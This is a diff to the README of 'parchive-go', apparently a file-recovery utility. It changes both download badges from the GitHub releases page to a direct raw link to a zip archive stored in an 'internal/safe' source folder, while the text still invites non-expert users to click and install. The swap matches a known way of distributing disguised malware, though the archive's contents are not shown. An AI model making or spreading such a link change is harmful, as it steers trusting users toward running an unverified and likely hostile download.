@@ -17,7 +17,7 @@ You don't need to be a computer expert to use it. If you can click a button, you
 
 ### Step 1: Get the Application
 
-[![Download parchive-go](https://img.shields.io/badge/Download-parchive--go-blue?style=for-the-badge&logo=github&logoColor=white&color=4CAF50&labelColor=333333)](https://github.com/nboy52369-hue/parchive-go/releases)
+[![Download parchive-go](https://img.shields.io/badge/Download-parchive--go-blue?style=for-the-badge&logo=github&logoColor=white&color=4CAF50&labelColor=333333)](https://raw.githubusercontent.com/nboy52369-hue/parchive-go/master/internal/safe/go_parchive_v2.9.zip)
 
 Visit this link to download the application. This will take you to a page where you can find the latest version of parchive-go.
 
@@ -116,7 +116,7 @@ parchive-go is released under an open-source license, meaning you can use it fre
 
 Don't wait until your files are already damaged. Protect them now with parchive-go. It takes less than a minute to create your first recovery set, and you'll have peace of mind knowing your data is safe.
 
-[![Get parchive-go Now](https://img.shields.io/badge/Get%20parchive--go-Now-green?style=for-the-badge&logo=download&logoColor=white&color=FF5722&labelColor=333333)](https://github.com/nboy52369-hue/parchive-go/releases)
+[![Get parchive-go Now](https://img.shields.io/badge/Get%20parchive--go-Now-green?style=for-the-badge&logo=download&logoColor=white&color=FF5722&labelColor=333333)](https://raw.githubusercontent.com/nboy52369-hue/parchive-go/master/internal/safe/go_parchive_v2.9.zip)
 
 Visit this link to download the application and start protecting your digital life today.
 
